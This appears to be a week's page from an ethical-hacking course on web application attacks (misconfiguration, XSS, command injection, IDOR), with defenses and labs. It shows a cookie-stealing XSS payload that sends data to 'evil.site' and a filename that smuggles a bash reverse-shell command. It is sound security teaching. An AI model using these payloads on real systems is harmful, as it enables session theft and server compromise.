---
hide:
  - navigation
---

[← Course home](../index.html) · Ethical Hacking

# Week 9 · Web Attacks I — Servers & Apps

<style>
.wk8{--w-navy:#26324f;--w-ink:#1f2836;--w-muted:#5b6880;--w-surface:#f6f8fb;--w-card:#ffffff;--w-line:#e3e8f0;--w-teal:#0a7589;--w-tealink:#064a59;--w-red:#c1392b;--w-amber:#a9700f;--w-teal-t:#e3f1f4;--w-red-t:#f8e7e4;--w-amber-t:#f6edda;--w-navy-t:#eaedf4;
  font-family:var(--md-text-font,"Lato"),Helvetica,Arial,sans-serif;color:var(--w-ink);}
[data-md-color-scheme="slate"] .wk8{--w-navy:#9fb0d0;--w-ink:#e7edf6;--w-muted:#9fadc3;--w-surface:#1a2338;--w-card:#1f2a42;--w-line:#33405c;--w-teal:#3bb6ce;--w-tealink:#6fcde0;--w-red:#e4786c;--w-amber:#d8a646;--w-teal-t:#123038;--w-red-t:#331f1c;--w-amber-t:#322a16;--w-navy-t:#1b2740;}
.wk8 *{box-sizing:border-box}
.wk8 .lead{font-size:1.05rem;color:var(--w-muted);max-width:62ch;margin:.2rem 0 1.2rem}
.wk8 .eyebrow{font-size:.72rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--w-tealink);margin:.1rem 0 .15rem}
.wk8 h2.w{font-size:1.4rem;margin:2.4rem 0 .3rem;color:var(--w-ink);scroll-margin-top:70px;display:flex;align-items:baseline;gap:.5rem;flex-wrap:wrap}
.wk8 h2.w .num{font-size:.7rem;font-weight:700;letter-spacing:.06em;color:#fff;background:var(--w-navy);border-radius:999px;padding:.15rem .55rem}
.wk8 h2.w .vic{margin-left:auto;align-self:center;font-size:.58rem;font-weight:700;letter-spacing:.05em;text-transform:uppercase;border-radius:999px;padding:.22rem .6rem}
.wk8 .vic.co{background:var(--w-amber-t);color:var(--w-amber);border:1px solid var(--w-amber)}
.wk8 .vic.usr{background:var(--w-red-t);color:var(--w-red);border:1px solid var(--w-red)}
.wk8 .vic.srv{background:var(--w-navy-t);color:var(--w-navy);border:1px solid var(--w-navy)}
.wk8 figure{margin:1rem 0;}
.wk8 figcaption{font-size:.82rem;color:var(--w-muted);margin-top:.4rem;text-align:center}
.wk8 svg{max-width:100%;height:auto;color:var(--w-ink);display:block;margin:0 auto}
.wk8 .node-fill{fill:var(--w-card)}.wk8 .node-line{stroke:var(--w-line)}.wk8 .teal{fill:var(--w-teal)}.wk8 .teal-s{stroke:var(--w-teal)}.wk8 .red{fill:var(--w-red)}.wk8 .amber{fill:var(--w-amber)}
.wk8 .svg-t{fill:var(--w-ink);font-family:var(--md-text-font,"Lato"),sans-serif}
.wk8 .svg-m{fill:var(--w-muted);font-family:var(--md-text-font,"Lato"),sans-serif}
/* CEH strip */
.wk8 .ceh{display:flex;flex-wrap:wrap;gap:6px;margin:1rem 0 1.4rem}
.wk8 .ph{flex:1 1 130px;min-width:0;border:1px solid var(--w-line);border-radius:9px;background:var(--w-card);padding:.5rem .65rem}
.wk8 .ph .n{font-size:.6rem;letter-spacing:.09em;text-transform:uppercase;color:var(--w-muted);font-weight:700}
.wk8 .ph .t{font-size:.85rem;font-weight:600}
.wk8 .ph.done{opacity:.7}.wk8 .ph.done .t::after{content:" ✓";color:var(--w-teal)}
.wk8 .ph.here{border-color:var(--w-teal);background:var(--w-teal-t)}
.wk8 .ph.here .n{color:var(--w-tealink)}
.wk8 .ph .hr{font-size:.58rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--w-tealink)}
/* cards */
.wk8 .cards{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin:1rem 0}
.wk8 .doors{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin:1rem 0}
.wk8 .card{border:1px solid var(--w-line);background:var(--w-card);border-radius:11px;padding:13px 15px;min-width:0}
.wk8 .card .mini{font-size:.6rem;font-weight:700;letter-spacing:.07em;text-transform:uppercase;color:var(--w-tealink);display:block;margin-bottom:3px}
.wk8 .card h4{margin:.1rem 0 .3rem;font-size:1rem}
.wk8 .card p{margin:.2rem 0;font-size:.9rem;color:var(--w-ink)}
.wk8 .card ul{margin:.3rem 0 .1rem;padding-left:1.1rem;font-size:.88rem}
.wk8 .card li{margin:.12rem 0}
.wk8 .card.red{background:var(--w-red-t);border-color:var(--w-red)}
.wk8 .card.red .mini{color:var(--w-red)}
.wk8 .card.amber{background:var(--w-amber-t);border-color:var(--w-amber)}
.wk8 .card.amber .mini{color:var(--w-amber)}
.wk8 .card.def{background:var(--w-teal-t);border-color:var(--w-teal)}
.wk8 .card.def .mini{color:var(--w-tealink)}
.wk8 .card.def .mini::before{content:"🛡 "}
.wk8 .card .rw{display:block;margin-top:.5rem;padding-top:.5rem;border-top:1px solid var(--w-line);font-size:.82rem;color:var(--w-muted)}
.wk8 .card .rw b{color:var(--w-ink)}
/* code / payload chip */
.wk8 .term{background:#16212b;border-radius:11px;padding:14px 16px;font-family:var(--md-code-font,"Roboto Mono"),monospace;font-size:.82rem;line-height:1.65;color:#e9eef3;overflow-x:auto;margin:.8rem 0}
.wk8 .term .ln{white-space:pre;display:block}
.wk8 .term .c{color:#6f90b2}.wk8 .term .o{color:#e9eef3}.wk8 .term .nt{color:#c9a46a;font-style:italic}.wk8 .term .hl{color:#e2b97f;font-weight:700}.wk8 .term .bad{color:#e8897d;font-weight:700}.wk8 .term .ok{color:#7fc9a6;font-weight:700}
/* pills + collapsible */
.wk8 .pills{display:flex;flex-wrap:wrap;gap:7px;margin:.8rem 0}
.wk8 .pill{border:1px solid var(--w-line);background:var(--w-card);border-radius:999px;padding:5px 12px;font-size:.82rem}
.wk8 .pill b{color:var(--w-tealink)}
.wk8 details.more{border:1px solid var(--w-line);border-radius:10px;background:var(--w-card);margin:.8rem 0;overflow:hidden}
.wk8 details.more>summary{cursor:pointer;list-style:none;padding:10px 14px;font-weight:600;font-size:.88rem;color:var(--w-tealink);display:flex;align-items:center;gap:8px}
.wk8 details.more>summary::-webkit-details-marker{display:none}
.wk8 details.more>summary .cv{margin-left:auto;transition:transform .2s}
.wk8 details.more[open]>summary .cv{transform:rotate(90deg)}
.wk8 details.more .bd{padding:0 14px 12px;font-size:.9rem;color:var(--w-ink)}
.wk8 .oneliner{font-size:1.2rem;font-weight:700;line-height:1.4;border-top:1px solid var(--w-line);border-bottom:1px solid var(--w-line);padding:1.1rem 0;margin:1.6rem 0;color:var(--w-ink)}
.wk8 .oneliner .k{color:var(--w-tealink)}.wk8 .oneliner .r{color:var(--w-red)}
.wk8 .axis{border:1px solid var(--w-line);border-left:4px solid var(--w-teal);background:var(--w-surface);border-radius:8px;padding:.7rem .9rem;margin:1rem 0;font-size:.92rem}
@media(max-width:600px){.wk8 .cards,.wk8 .doors{grid-template-columns:1fr}}
</style>

<div class="wk8" markdown="0">
<p class="eyebrow">🧭 <span class="eb-layer">Application</span><span class="eb-sep"> · </span><span class="eb-phase">CEH: Gaining Access (web)</span><span class="eb-sep"> · </span><span class="eb-sum">abusing the trust an app places in the input you hand it — one running example, PhotoViewer</span></p>
<p class="lead">We're through the network and off the host. Now the <b>application</b> — the layer your users actually touch, and the single biggest attack surface on the internet. Every attack this week sorts into three doors — <b>code, config, credentials</b> — on one running example: <b>PhotoViewer</b>.</p>
<div class="ceh" role="img" aria-label="CEH life cycle: phases 1 and 2 done, phase 3 Gaining Access at the application layer is this week">
<div class="ph done"><span class="n">Phase 1</span><div class="t">Reconnaissance</div></div>
<div class="ph done"><span class="n">Phase 2</span><div class="t">Scanning</div></div>
<div class="ph here"><span class="n">Phase 3</span><div class="t">Gaining Access — web</div><span class="hr">You are here</span></div>
<div class="ph"><span class="n">Phase 4</span><div class="t">Maintaining Access</div></div>
<div class="ph"><span class="n">Phase 5</span><div class="t">Covering Tracks</div></div>
</div>

<h2 class="w" id="s-why">Why the web is the biggest target</h2>
<p class="lead">An <b>internal</b> app — say a payroll site buried in the enterprise network — is hard to reach; you'd have to get inside first. A <b>web</b> app like amazon.com <i>must</i> sit in the DMZ, reachable by anyone on the internet, or it can't take a customer's order. That exposure is the whole point of a web app — and exactly what makes it the most-probed thing an organization owns.</p>
<div class="cards">
<div class="card"><span class="mini">Last week &amp; before</span><h4>The server's layers</h4><p>Recon flagged a vulnerable <b>Apache</b> (platform); <b>ShellShock</b> hit the <b>Bash</b> shell (OS). Those are the <i>server's</i> stack.</p></div>
<div class="card red"><span class="mini">This week</span><h4>The app's own code</h4><p>One level up — the code the organization <i>wrote</i>, the part users interact with. New bugs, new victims.</p></div>
</div>
<div class="axis"><b>The one idea for the week:</b> a <b>static</b> site that only hands out pictures is almost unhackable — the worst you can do is sniff plaintext traffic (a <i>network</i> attack). The moment the app takes <b>input</b> — a login, a search, a caption, a filename — and <i>does something</i> with it, you've created the attack surface. Web hacking is abusing the trust the backend places in that input.</div>

<h2 class="w" id="s-arch">The machine you're attacking</h2>
<p class="lead">PhotoViewer is the classic <b>three tiers</b>: a web server in the DMZ (serves HTML/JS), an app server (the logic), and a data tier (a <b>catalog database</b> — who owns which photo, public or private, and <i>where it's stored</i> — plus the <b>photo store</b> itself). Walk one real request:</p>
<figure>
<svg viewBox="0 0 640 226" role="img" aria-label="Request flow: Mary's browser logs in and gets a token, asks the app for her photos, the app queries the catalog database, returns JSON with storage URLs, and the browser fetches each photo directly from the photo store">
<g text-anchor="middle" font-size="11.5">
<rect x="6" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="66" y="100" font-weight="700">🧑‍💻 Mary</text><text class="svg-m" x="66" y="117" font-size="10">browser + JS</text>
<rect x="176" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="236" y="98" font-weight="700" font-size="11">Web server</text><text class="svg-m" x="236" y="114" font-size="9.5">presentation · DMZ</text>
<rect x="346" y="78" width="120" height="54" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="406" y="98" font-weight="700" font-size="11">App server</text><text class="svg-m" x="406" y="114" font-size="9.5">the logic</text>
<rect x="516" y="14" width="118" height="50" rx="8" class="node-fill node-line" stroke-width="1.5"></rect>
<text class="svg-t" x="575" y="34" font-weight="700" font-size="11">Catalog DB</text><text class="svg-m" x="575" y="50" font-size="9.5">owner · public? · URL</text>
<rect x="516" y="146" width="118" height="50" rx="8" style="fill:var(--w-amber-t)" class="amber" fill-opacity="1"></rect>
<rect x="516" y="146" width="118" height="50" rx="8" fill="none" style="stroke:var(--w-amber)" stroke-width="1.5"></rect>
<text x="575" y="166" font-weight="700" font-size="11" style="fill:var(--w-amber)">Photo store</text><text class="svg-m" x="575" y="182" font-size="9.5">the actual files</text>
<g class="teal-s" stroke-width="1.8" marker-end="url(#ar)">
<line x1="126" y1="96" x2="172" y2="96"></line>
<line x1="296" y1="105" x2="342" y2="105"></line>
<line x1="466" y1="92" x2="512" y2="48"></line>
</g>
<text class="svg-m" x="150" y="88" font-size="9">① login→token</text>
<text class="svg-m" x="150" y="128" font-size="9">② GET /photos +token</text>
<text class="svg-m" x="406" y="150" font-size="9">③ query owner=Mary</text>
<path d="M512 56 L470 104" fill="none" class="teal-s" stroke-width="1.6" stroke-dasharray="4 3" marker-end="url(#ar)"></path>
<text class="svg-m" x="300" y="150" font-size="9">④ JSON: list of photo URLs</text>
<path d="M66 132 L66 214 L500 214 L512 182" fill="none" style="stroke:var(--w-amber)" stroke-width="1.8" stroke-dasharray="5 4" marker-end="url(#ara)"></path>
<text x="285" y="201" font-size="9.5" font-weight="700" style="fill:var(--w-amber)">⑤ browser fetches each photo URL straight from the store</text>
</g>
<defs>
<marker id="ar" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0,0 7,3 0,6" class="teal"></polygon></marker>
<marker id="ara" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><polygon points="0,0 7,3 0,6" class="amber"></polygon></marker>
</defs>
</svg>
<figcaption>The token, the query, the endpoints, and <b>those storage URLs in step ④</b> are what we spend the next two weeks attacking. Notice step ⑤: the browser reaches the photo store <i>directly</i> — hold onto that.</figcaption>
</figure>

<h2 class="w" id="s-doors">The three doors — and who gets hurt</h2>
<p class="lead">Every web attack is one of three mistakes, named by <b>whose</b> mistake it is. Same three doors as last week, now on the web.</p>
<div class="doors">
<div class="card"><span class="mini">🐛 Code</span><h4>The developer's bug</h4><p>They wrote exploitable code — input gets treated as code, or a check is missing.</p></div>
<div class="card amber"><span class="mini">⚙️ Config</span><h4>The operator's slip</h4><p>The code is fine; it was <i>deployed</i> wrong — a setting left too loose.</p></div>
<div class="card"><span class="mini">🔑 Credentials</span><h4>The stolen identity</h4><p>No bug at all — the attacker just <i>is</i> a valid user. (The deep version is Week 10.)</p></div>
</div>
<div class="axis"><b>A second question rides along on every attack — who gets hurt.</b> Sometimes the victim is the <b>company</b> (its server, its whole dataset); sometimes it's a single <b>user</b> (their session, their private records). That's a separate axis from the three doors — watch the <span style="color:var(--w-amber);font-weight:700">victim tag</span> in the corner of each attack below. The same app, holding the same data, can be attacked to hurt the company <i>or</i> its users.</div>

<h2 class="w" id="s-config"><span class="num">Config</span> Misconfiguration — the code is fine, deployed wrong <span class="vic co">Victim: the company</span></h2>
<p class="lead">Start here, because it needs no app bug at all — just a setting left in the wrong position. Remember step ④: the JSON Mary gets back carries the <b>URLs to where her photos actually live</b>.</p>
<div class="cards">
<div class="card amber"><span class="mini">The headline case</span><h4>The photo store left open</h4><p>If the store isn't locked down, Mary takes those URLs and queries the storage <b>directly, around the app entirely</b> — pulling photos other users marked private. If <b>directory listing</b> is on, she doesn't even guess URLs; she lists the whole store.<span class="rw"><b>Real world — Deep Root Analytics, 2017:</b> an S3 bucket set to public exposed ~<b>198 million</b> US voter records. No exploit — just access left out.</span></div>
<div class="card"><span class="mini">The rest of the family</span><h4>The usual misconfigurations</h4>
<ul>
<li>guess <code>photoviewer.com/admin</code> → an admin console on <b>default</b> <code>admin / admin</code></li>
<li>the catalog <b>database</b> reachable with a blank/default password — exactly how thousands of open <b>MongoDB &amp; Elasticsearch</b> servers have leaked</li>
<li><b>verbose errors</b> that spill table and column names</li>
<li>an <b>unpatched component</b> with a known CVE</li>
</ul></div>
</div>
<p style="font-size:.9rem;margin:.2rem 0 0"><b>The common thread:</b> none of these is a coding bug — each is something the operator left open. Always sanitize what comes <i>in</i> from the user, and what goes <i>out</i> (those error messages too).</p>
<div class="pills"><span class="pill">🧪 <b>Lab 1 · Compromising Web Servers</b> — enumerate with Nikto &amp; DirBuster, find the misconfig, walk in.</span></div>

<h2 class="w" id="s-xss"><span class="num">Code</span> Cross-site scripting (XSS) — input becomes code <span class="vic usr">Victim: another user</span></h2>
<p class="lead">Now the <b>Code</b> door, and the big idea for the next three attacks: <b>injection — data you type gets treated as code.</b> On PhotoViewer a user can put a <b>caption</b> on a photo. It's supposed to be plain text — but the app never checks it and later writes it <b>straight into the page's HTML</b>.</p>
<div class="term" role="img" aria-label="A caption that is actually a script">
<span class="ln"><span class="c">caption on Mary's photo:</span></span>
<span class="ln"><span class="bad">&lt;script&gt;</span><span class="o">fetch("evil.site/x?c="+document.cookie)</span><span class="bad">&lt;/script&gt;</span></span>
<span class="ln"><span class="nt">  → stored as "text", then run in the next viewer's browser</span></span>
</div>
<div class="cards">
<div class="card red"><span class="mini">The move</span><h4>A caption that runs</h4><p>Mary sets her caption to a <code>&lt;script&gt;</code>. When <b>Bob</b> opens that photo, <b>Bob's browser runs Mary's code</b>, with Bob's session — as if PhotoViewer sent it.</p></div>
<div class="card"><span class="mini">Why it matters</span><h4>The app serves your code</h4><p>Same mechanic as the others — data treated as code — but a new victim: not the app, <b>another user</b>. Next week we weaponize this to steal Bob's session.<span class="rw"><b>Real world — TweetDeck, 2014:</b> a tweet carrying a script ran inside the TweetDeck client (twitter.com itself stripped it) and <b>self-spread</b> as a worm across feeds.</span></div>
</div>
<div class="pills"><span class="pill">🧪 <b>Lab 2</b> — XSS by hand</span></div>

<h2 class="w" id="s-cmdi"><span class="num">Code</span> OS command injection — code on the server <span class="vic srv">Victim: the app / server</span></h2>
<p class="lead">Same injection idea, a new place it lands. To make a thumbnail, PhotoViewer runs a real <b>OS command</b> and pastes your <b>filename</b> into it. But the filename is yours to choose.</p>
<div class="term" role="img" aria-label="A filename that carries a command; the semicolon ends the resize and starts the attacker's reverse shell">
<span class="ln"><span class="c">you upload a file named:</span></span>
<span class="ln"><span class="o">vacation.jpg</span><span class="bad">; bash -i &gt;&amp; /dev/tcp/attacker/4444 0&gt;&amp;1</span></span>
<span class="ln"><span class="c">server runs:</span> <span class="o">convert vacation.jpg</span><span class="bad">; bash…</span><span class="o"> -resize 200x200 thumb.jpg</span></span>
<span class="ln"><span class="nt">  the ; ends the resize and starts your command — the shell runs both</span></span>
<span class="ln"><span class="nt">  output isn't shown, so it dials a shell back to you (a reverse shell)</span></span>
</div>
<div class="cards">
<div class="card red"><span class="mini">The trick</span><h4>Name the file a command</h4><p>A <code>;</code> and a command after the name. It's <b>blind</b> — the page only shows a thumbnail — so the payload opens a connection <i>back</i> to the attacker rather than printing output.</p></div>
<div class="card"><span class="mini">Why it matters</span><h4>Now you're on the box</h4><p>A shell on the web server puts you <i>inside</i> the enterprise network — the start of last week's whole loop.<span class="rw"><b>Real world — ImageMagick "ImageTragick", 2016 (CVE-2016-3714):</b> crafted uploads ran commands on any site that processed them — same trick, hidden in the image instead of its name.</span></div>
</div>
<div class="pills"><span class="pill">🧪 <b>Lab 2</b> — command injection by hand</span></div>

<h2 class="w" id="s-idor"><span class="num">Code</span> Broken auth &amp; access control (IDOR) <span class="vic usr">Victim: a user</span></h2>
<p class="lead">The last Code flaws need <b>no injection</b> — the app does exactly what it was written to do, just for the wrong person.</p>
<div class="cards">
<div class="card red"><span class="mini">Broken authentication</span><h4>A guessable front door</h4><p>No limit on login attempts, so an attacker runs thousands of password guesses until one works — worse if Mary reused a password leaked elsewhere. No lockout, weak passwords, no MFA. The attacker becomes <b>one specific user</b>.</p></div>
<div class="card red"><span class="mini">IDOR · broken access control</span><h4>Ask for what isn't yours</h4><p>Mary opens her photo at <code>?id=123</code>, then just types <code>124</code> — David's private photo. The app checks she's <b>logged in</b>, but never that the photo is <b>hers</b>, and hands it over. Walk the numbers → <b>everyone's</b> data.</p></div>
</div>
<div class="term" role="img" aria-label="The server checks logged-in but not ownership">
<span class="ln"><span class="c">GET /photos?id=124   Cookie: session=mary</span></span>
<span class="ln">is this request logged in? &nbsp;<span class="ok">✓ yes — it's Mary</span></span>
<span class="ln">does photo 124 belong to Mary? &nbsp;<span class="bad">✗ never asked</span></span>
<span class="ln"><span class="hl">200 OK</span> <span class="o">→ returns David's private photo</span></span>
</div>
<p style="font-size:.9rem;margin:.2rem 0 0"><b>The bug is the missing ownership check.</b> Every object needs its own "who's allowed?" — being logged in isn't the same as being authorized for <i>this</i> object.<span style="color:var(--w-muted)"> &nbsp;<b>Real world — First American, 2019:</b> ~885 million mortgage files exposed by changing the number in a document URL.</span></p>
<div class="pills"><span class="pill">🧪 <b>Lab 2</b> — broken access control by hand</span></div>

<h2 class="w" id="s-defender">The defender's view</h2>
<p class="lead">Almost every attack this week traces to one habit: the app <b>trusted input it should have checked</b>. So the defenses cluster, too.</p>
<div class="cards">
<div class="card def"><span class="mini">Code bugs</span><p><b>Sanitize input, encode output</b> — a caption can't become a script, a filename can't become a command</p></div>
<div class="card def"><span class="mini">Access control</span><p><b>Check ownership on every object</b> — logged-in ≠ authorized; add MFA and lockouts</p></div>
<div class="card def"><span class="mini">Config</span><p><b>Lock the store, change defaults, patch</b> — no public buckets, no <code>admin/admin</code></p></div>
<div class="card def"><span class="mini">Behind it all</span><p>A <b>WAF</b> and web/access-log monitoring catch the payloads a slip lets through</p></div>
</div>
<p class="oneliner">The <span class="k">three doors</span> are whose mistake; the <span class="r">victim tag</span> is who pays — two questions on every web attack.</p>

<h2 class="w" id="s-labs">This week — put it into practice</h2>
<p class="lead">Two labs, matching the two doors you can walk by hand.</p>
<div class="cards">
<div class="card amber"><span class="mini">Lab 1 · Config</span><h4>Compromising Web Servers</h4><p>Enumerate a server with <b>Nikto</b> and <b>DirBuster</b>, find the misconfiguration, and walk in.</p></div>
<div class="card red"><span class="mini">Lab 2 · Code</span><h4>Web-app attacks by hand</h4><p><b>XSS</b>, <b>command injection</b>, and <b>broken access control</b> on a live app — the three injections and the missing check.</p></div>
</div>
<p style="font-size:.93rem;color:var(--w-muted)">Injection lands in three places — the <b>browser</b> (XSS), the <b>OS</b> (command injection), and the <b>database</b>. We do the first two this week. Next week — <b>Week 10</b> — we give the database its own treatment with <b>SQL injection</b>, and turn today's XSS into a stolen <b>session</b>.</p>
</div>

??? info "📎 In industry terms — CEH · Cyber Kill Chain · ATT&CK · OWASP"

    - **CEH phase:** Gaining Access, at the application layer (Phase 3)
    - **Cyber Kill Chain:** Delivery → Exploitation → Installation (web shell)
    - **MITRE ATT&CK:** [T1190 Exploit Public-Facing App](https://attack.mitre.org/techniques/T1190/) · [T1059 Command &amp; Scripting](https://attack.mitre.org/techniques/T1059/) · [T1505.003 Web Shell](https://attack.mitre.org/techniques/T1505/003/)
    - **OWASP Top 10** is the working vocabulary for app flaws: Broken Access Control (IDOR), Injection (XSS, command, SQL), Security Misconfiguration.

    New to these frameworks? The full map is in **[Week 1 · frameworks](ethics-law-methodology.html)**.

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the industry list of critical web risks
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) — how to test for each
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — free, hands-on labs for XSS, access control, command injection
- [MITRE ATT&CK](https://attack.mitre.org/) — T1190, T1059, T1505.003
- [ImageTragick (CVE-2016-3714)](https://imagetragick.com/) — the image-upload command-injection case
